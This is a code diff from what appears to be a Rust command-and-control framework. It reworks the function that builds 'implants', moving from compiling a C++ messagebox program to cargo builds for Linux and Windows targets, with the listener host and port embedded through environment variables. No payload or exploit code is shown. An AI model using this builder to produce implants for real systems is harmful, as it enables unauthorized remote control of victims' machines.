@@ -1,7 +1,9 @@
 use log::{error, info};
 use std::fs::File;
+use std::env;
 use std::io::{Error, ErrorKind, Read};
 use std::process::Command;
+use url::Url;
 
 use crate::config::Config;
 
@@ -19,29 +21,87 @@ pub fn generate(
 
     info!("Generating an implant...");
 
-    let ext = match format.as_str() {
-        // "aspx" => ".aspx",
-        // "docx" => ".docx",
-        "elf" => "",
-        "exe" => ".exe",
+    let parsed_url = Url::parse(&listener_url).unwrap();
+    let proto = parsed_url.scheme();
+    let host = parsed_url.host().unwrap();
+    let port = parsed_url.port().unwrap();
+
+    // Set environment variables for `config.rs` when building an implant.
+    env::set_var("LPROTO", proto.to_string());
+    env::set_var("LHOST", host.to_string());
+    env::set_var("LPORT", port.to_string());
+    env::set_var("OUT_DIR", format!("implants/src"));
+
+    let outdir = format!("{}/implants/{}", config.app_dir.display(), name.to_string());
+
+    let (cmd, args, outfile) = match (os.as_str(), arch.as_str(), format.as_str()) {
+        ("linux", "amd64", "elf") => {
+            (
+                "cargo",
+                [
+                    "build",
+                    "--manifest-path=implants/Cargo.toml",
+                    "--target",
+                    "x86_64-unknown-linux-gnu",
+                    "--target-dir",
+                    outdir.as_str(),
+                    "--release"
+                ],
+                format!("{}/x86_64-unknown-linux-gnu/release/implant", outdir),
+            )
+        }
+        ("linux", "i686", "elf") => {
+            (
+                "cargo",
+                [
+                    "build",
+                    "--manifest-path=implants/Cargo.toml",
+                    "--target",
+                    "i686-unknown-linux-gnu",
+                    "--target-dir",
+                    outdir.as_str(),
+                    "--release"
+                ],
+                format!("{}/i686-unknown-linux-gnu/release/implant", outdir),
+            )
+        }
+        ("windows", "amd64", "exe") => {
+            (
+                "cargo",
+                [
+                    "build",
+                    "--manifest-path=implants/Cargo.toml",
+                    "--target",
+                    "x86_64-pc-windows-gnu",
+                    "--target-dir",
+                    outdir.as_str(),
+                    "--release"
+                ],
+                format!("{}/x86_64-pc-windows-gnu/release/implant.exe", outdir),
+            )
+        }
+        ("windows", "i686", "exe") => {
+            (
+                "cargo",
+                [
+                    "build",
+                    "--manifest-path=implants/Cargo.toml",
+                    "--target",
+                    "i686-pc-windows-gnu",
+                    "--target-dir",
+                    outdir.as_str(),
+                    "--release"
+                ],
+                format!("{}/i686-pc-windows-gnu/release/implant.exe", outdir),
+            )
+        }
         _ => {
-            return Err(std::io::Error::from(std::io::ErrorKind::InvalidData));
+            return Err(Error::new(ErrorKind::Other, "Invalid options."));
         }
     };
 
-    let infile = "implants/cpp/messagebox.cpp";
-    let outfile = format!("{}/server/implants/{}{}", config.app_dir.display(), name, ext);
 
-    let (gcc, args) = match (os.as_str(), arch.as_str()) {
-        ("linux",   "amd64")    => { ("g++", [&infile, "-o", &outfile, ""]) }
-        ("windows", "amd64")    => { ("/usr/bin/x86_64-w64-mingw32-g++", [&infile, "-o", &outfile, "-lwinhttp"]) }
-        ("windows", "i386")     => { ("/usr/bin/i686-w64-mingw32-g++", [&infile, "-o", &outfile, "-lwinhttp"]) }
-        _ => {
-            return Err(std::io::Error::from(std::io::ErrorKind::InvalidData));
-        }
-    };
-
-    let output = Command::new(gcc)
+    let output = Command::new(cmd)
         .args(args)
         .output();
 
@@ -52,7 +112,7 @@ pub fn generate(
                 let mut f = File::open(outfile.to_owned()).unwrap();
                 let mut buffer = Vec::new();
                 f.read_to_end(&mut buffer).unwrap();
-                return Ok((outfile, buffer));
+                return Ok((outfile.to_string(), buffer));
             } else {
                 return Err(Error::new(ErrorKind::Other, "Failed to generate an implant."));
             }
